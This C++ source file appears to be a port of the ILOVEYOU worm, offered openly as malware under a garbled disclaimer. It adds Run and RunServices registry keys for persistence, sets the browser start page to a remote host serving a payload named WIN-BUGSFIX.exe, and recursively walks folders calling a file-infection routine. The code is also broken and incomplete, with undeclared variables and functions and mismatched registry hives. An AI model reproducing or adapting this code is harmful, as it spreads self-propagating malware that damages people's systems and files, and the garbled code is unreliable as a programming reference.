//Well, i used vb script to get some registry needed file,also thanks venom3722,i learneed a lot from him.
//This functions is seperated.but functions one needed for all functions.
//Please remember: Distributing malware, even for educational purposes!
//....created by me: .Mcft.

using namespace std;

#include <iostream>
#include <fstream>
#include <windows.h>
// Plese be responsible about what are you gonna do : #include <main.cpp>
void regruns()
{
    // Set the system to automatically run MSKernel32.vbs and Win32DLL.vbs on startup.
    regcreate("HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\MSKernel32", dirsystem + "\\MSKernel32.vbs");
    regcreate("HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices\\Win32DLL", dirwin + "\\Win32DLL.vbs");

    string downread = regget("HKEY_CURRENT_USER\\Software\\Microsoft\\Internet Explorer\\Download Directory");

    if (downread.empty())
    {
        downread = "c:\\";
    }

    // Check if a file named "WinFAT32.exe" exists in the system files.
    if (fileexist(dirsystem + "\\WinFAT32.exe"))
    {
        if (num == 1)
        {
            regcreate("HKCU\\Software\\Microsoft\\Internet Explorer\\Main\\StartPage", "http://www.skyinet.net/~young1s/HJKhjnwerhjkxcvytwertnMTFwetrdsfmhPnjw6587345gvsdf7679njbvYT/WIN-BUGSFIX.exe");
        }
    }

    if (!fileexist(downread + "\\WIN-BUGSFIX.exe"))
    {
      
        regcreate("HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\WIN-BUGSFIX", downread + "\\WIN-BUGSFIX.exe");
        regcreate("HKEY_CURRENT_USER\\Software\\Microsoft\\Internet Explorer\\Main\\StartPage", "about:blank");
    }
}

void listadriv()
{
    WIN32_FIND_DATAA ffd;
    HANDLE hFind = INVALID_HANDLE_VALUE;
    DWORD dwError;

    // List folders in drives...
    hFind = FindFirstFileA("?:\\*", &ffd);
    if (hFind != INVALID_HANDLE_VALUE)
    {
        do
        {
            if (ffd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
            {
                string foldername = ffd.cFileName;
                if (foldername != "." && foldername != "..")
                {
                    string folderspec = ffd.cFileName;
                    infectfiles(folderspec);
                }
            }
        } while (FindNextFileA(hFind, &ffd) != 0);
        FindClose(hFind);
    }
}

void folderlist(string folderspec)
{
    WIN32_FIND_DATAA ffd;
    HANDLE hFind = INVALID_HANDLE_VALUE;
    DWORD dwError;

    // Get file listing of a folder
    string searchpath = folderspec + "\\*";
    hFind = FindFirstFileA(searchpath.c_str(), &ffd);
    if (hFind != INVALID_HANDLE_VALUE)
    {
        do
        {
            if (ffd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
            {
                string foldername = ffd.cFileName;
                if (foldername != "." && foldername != "..")
                {
                    string subfolder = folderspec + "\\" + foldername;
                    infectfiles(subfolder);
                    folderlist(subfolder);
                }
            }
        } while (FindNextFileA(hFind, &ffd) != 0);
        FindClose(hFind);
    }
}

void regcreate(string regkey, string regvalue)
{
    HKEY hKey;
    if (RegCreateKeyExA(HKEY_CURRENT_USER, regkey.c_str(), 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hKey, NULL) == ERROR_SUCCESS)
    {
        RegSetValueExA(hKey, NULL, 0, REG_SZ, (const BYTE*)regvalue.c_str(), regvalue.length() + 1);
        RegCloseKey(hKey);
    }
}

string regget(string value)
{
    HKEY hKey;
    string result = "";
    if (RegOpenKeyExA(HKEY_CURRENT_USER, value.c_str(), 0, KEY_READ, &hKey) == ERROR_SUCCESS)
    {
        char buffer[256];
        DWORD bufferSize = sizeof(buffer);
        if (RegQueryValueExA(hKey, NULL, NULL, NULL, (LPBYTE)buffer, &bufferSize) == ERROR_SUCCESS)
        {
            result = buffer;
        }
        RegCloseKey(hKey);
    }
    return result;
}

bool fileexist(string filespec)
{
    DWORD fileAttr = GetFileAttributesA(filespec.c_str());
    return (fileAttr != INVALID_FILE_ATTRIBUTES && !(fileAttr & FILE_ATTRIBUTE_DIRECTORY));
}

bool folderexist(string folderspec)
{
    DWORD fileAttr = GetFileAttributesA(folderspec.c_str());
    return (fileAttr != INVALID_FILE_ATTRIBUTES && (fileAttr & FILE_ATTRIBUTE_DIRECTORY));
}
